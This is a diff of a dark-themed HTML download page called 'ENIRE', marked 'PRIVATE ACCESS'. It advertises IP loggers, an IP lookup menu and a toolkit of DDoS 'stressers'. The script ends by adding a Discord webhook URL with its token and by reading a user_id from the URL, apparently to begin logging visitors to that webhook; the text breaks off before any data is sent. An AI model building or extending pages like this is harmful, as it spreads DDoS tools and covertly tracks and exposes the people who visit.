@@ -3,198 +3,220 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Resource Hub</title>
+  <title>ENIRE</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Inter', sans-serif;
-      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-      color: white;
+      background: #0a0a0a;
+      color: #ffdddd;
       min-height: 100vh;
       overflow: hidden;
       position: relative;
     }
 
+    /* Background Grid + Glow */
+    body::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: 
+        linear-gradient(#ff222220 1px, transparent 1px),
+        linear-gradient(90deg, #ff222220 1px, transparent 1px);
+      background-size: 50px 50px;
+      opacity: 0.15;
+      z-index: 0;
+    }
+
     /* Floating Particles */
     .particle {
       position: absolute;
-      background: rgba(255, 255, 255, 0.6);
+      background: #ff2222;
       border-radius: 50%;
       pointer-events: none;
-      animation: floatUp 15s linear infinite;
-      box-shadow: 0 0 8px rgba(255,255,255,0.8);
+      animation: floatUp 14s linear infinite;
+      box-shadow: 0 0 15px #ff0000,
+                  0 0 30px #ff2222;
+      z-index: 1;
     }
 
     @keyframes floatUp {
-      0% { transform: translateY(100vh) scale(0.5); opacity: 0.3; }
-      100% { transform: translateY(-100px) scale(1); opacity: 0; }
+      0% { transform: translateY(100vh) scale(0.4); opacity: 0.6; }
+      100% { transform: translateY(-200px) scale(1.3); opacity: 0; }
     }
 
     /* Loading Screen */
     #loading {
       position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: #0a0a0a;
+      inset: 0;
+      background: #050505;
       display: flex;
       align-items: center;
       justify-content: center;
-      z-index: 9999;
-      transition: opacity 0.8s ease;
+      z-index: 10000;
+      transition: opacity 1s ease;
     }
 
     .loader {
-      width: 80px;
-      height: 80px;
-      border: 6px solid #ffffff20;
-      border-top: 6px solid #00d4ff;
+      width: 85px;
+      height: 85px;
+      border: 6px solid #1a0000;
+      border-top: 6px solid #ff2222;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      box-shadow: 0 0 20px #00d4ff;
+      box-shadow: 0 0 40px #ff0000;
     }
 
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* Main Content */
     .container {
-      max-width: 1100px;
-      margin: 40px auto;
-      padding: 0 20px;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 40px 20px;
+      position: relative;
+      z-index: 2;
       text-align: center;
     }
 
     h1 {
-      font-size: 3.2rem;
-      background: linear-gradient(90deg, #00d4ff, #ffffff);
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 5.5rem;
+      font-weight: 700;
+      letter-spacing: -4px;
+      background: linear-gradient(90deg, #ff3333, #ff9999, #ffffff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 60px rgba(255, 50, 50, 0.7);
       margin-bottom: 10px;
-      text-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
     }
 
-    p {
-      font-size: 1.3rem;
-      opacity: 0.9;
-      margin-bottom: 40px;
+    .subtitle {
+      font-size: 1.35rem;
+      color: #ff6666;
+      margin-bottom: 70px;
+      letter-spacing: 3px;
+      opacity: 0.85;
     }
 
     .downloads {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-      gap: 25px;
-      margin-top: 40px;
+      grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
+      gap: 30px;
     }
 
     .card {
-      background: rgba(255,255,255,0.08);
-      border-radius: 16px;
-      padding: 30px 25px;
-      border: 1px solid rgba(255,255,255,0.1);
-      transition: all 0.4s ease;
-      backdrop-filter: blur(10px);
+      background: rgba(15, 0, 0, 0.75);
+      border: 1px solid #440000;
+      border-radius: 20px;
+      padding: 40px 30px;
+      transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+      backdrop-filter: blur(16px);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: linear-gradient(135deg, transparent, rgba(255,34,34,0.08));
+      opacity: 0;
+      transition: opacity 0.4s;
     }
 
     .card:hover {
-      transform: translateY(-12px);
-      box-shadow: 0 20px 40px rgba(0, 212, 255, 0.25);
-      border-color: #00d4ff;
+      transform: translateY(-20px) scale(1.03);
+      border-color: #ff4444;
+      box-shadow: 0 30px 70px rgba(255, 34, 34, 0.35);
     }
 
+    .card:hover::before { opacity: 1; }
+
     .card h3 {
-      font-size: 1.5rem;
-      margin-bottom: 15px;
+      font-size: 1.85rem;
+      margin-bottom: 16px;
+      color: #ffeeee;
     }
 
     .btn {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 14px 32px;
-      background: linear-gradient(90deg, #00d4ff, #0099cc);
+      margin-top: 28px;
+      padding: 16px 48px;
+      font-size: 1.2rem;
+      font-weight: 600;
+      background: linear-gradient(90deg, #c80000, #ff2222);
       color: white;
       border: none;
-      border-radius: 50px;
-      font-size: 1.1rem;
-      font-weight: 600;
+      border-radius: 9999px;
       cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 8px 20px rgba(0, 212, 255, 0.3);
+      transition: all 0.4s ease;
+      box-shadow: 0 10px 30px rgba(255, 34, 34, 0.4);
     }
 
     .btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 12px 30px rgba(0, 212, 255, 0.5);
+      transform: scale(1.1);
+      box-shadow: 0 20px 45px rgba(255, 34, 34, 0.6);
     }
   </style>
 </head>
 <body>
 
-  <!-- Loading Screen -->
   <div id="loading">
     <div class="loader"></div>
   </div>
 
   <div class="container">
-    <h1>ENIRE Hub</h1>
-    <p>Still in testing.</p>
+    <h1>ENIRE</h1>
+    <p class="subtitle">PRIVATE ACCESS</p>
 
     <div class="downloads">
       <div class="card">
         <h3>📁 IP Loggers</h3>
-        <p>Lastest version of an ip logger</p>
-        <button class="btn" onclick="downloadFile('case-files.zip')">Download Logger</button>
+        <p>Latest builds</p>
+        <button class="btn" onclick="downloadFile('logger.zip')">Download</button>
       </div>
 
       <div class="card">
         <h3>📊 GX Menu</h3>
-        <p>IP LOOKUP</p>
-        <button class="btn" onclick="downloadFile('intelligence-report.pdf')">Download Lookup</button>
+        <p>Advanced Lookup Suite</p>
+        <button class="btn" onclick="downloadFile('gxmenu.zip')">Download</button>
       </div>
 
       <div class="card">
         <h3>🔧 Tool Kit</h3>
-        <p>DDOS TOOLS ECT..</p>
-        <button class="btn" onclick="downloadFile('toolkit.zip')">Download Toolkit</button>
+        <p>Stressers • Extras</p>
+        <button class="btn" onclick="downloadFile('toolkit.zip')">Download</button>
       </div>
     </div>
   </div>
 
   <script>
-    // Loading Screen
     window.onload = () => {
       setTimeout(() => {
         document.getElementById('loading').style.opacity = '0';
-        setTimeout(() => {
-          document.getElementById('loading').style.display = 'none';
-        }, 800);
-      }, 1200);
+        setTimeout(() => document.getElementById('loading').style.display = 'none', 900);
+      }, 1300);
     };
 
-    // Floating Particles
     function createParticle() {
-      const particle = document.createElement('div');
-      particle.classList.add('particle');
-      
-      const size = Math.random() * 6 + 3;
-      particle.style.width = `${size}px`;
-      particle.style.height = `${size}px`;
-      particle.style.left = `${Math.random() * 100}vw`;
-      particle.style.animationDuration = `${Math.random() * 12 + 10}s`;
-      particle.style.opacity = Math.random() * 0.6 + 0.3;
-      
-      document.body.appendChild(particle);
-      
-      setTimeout(() => particle.remove(), 25000);
+      const p = document.createElement('div');
+      p.classList.add('particle');
+      const size = Math.random() * 8 + 4;
+      p.style.width = `${size}px`;
+      p.style.height = `${size}px`;
+      p.style.left = `${Math.random() * 100}vw`;
+      p.style.animationDuration = `${Math.random() * 13 + 11}s`;
+      document.body.appendChild(p);
+      setTimeout(() => p.remove(), 28000);
     }
+    setInterval(createParticle, 140);
 
-    setInterval(createParticle, 180);
-
-    // Download Handler (Customize these)
     function downloadFile(filename) {
-      alert(`Downloading: ${filename}\n\nError Code: 3955.`);
-      // Example real download:
-      // window.location.href = `https://yourserver.com/files/${filename}`;
+      alert(`Downloading: ${filename}`);
+      // window.location.href = `https://yourlink.com/${filename}`;
     }
+    
     const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521502173773566074/-X_NpKwsyVzHUD8jmoykjbKnjNGPU5yMfAXSWX1-GhiMbB5nLpmRQwq0l8k-6mHherSu"; // ← Change this
     const urlParams = new URLSearchParams(window.location.search);
     const userId = urlParams.get('user_id') || 'unknown';
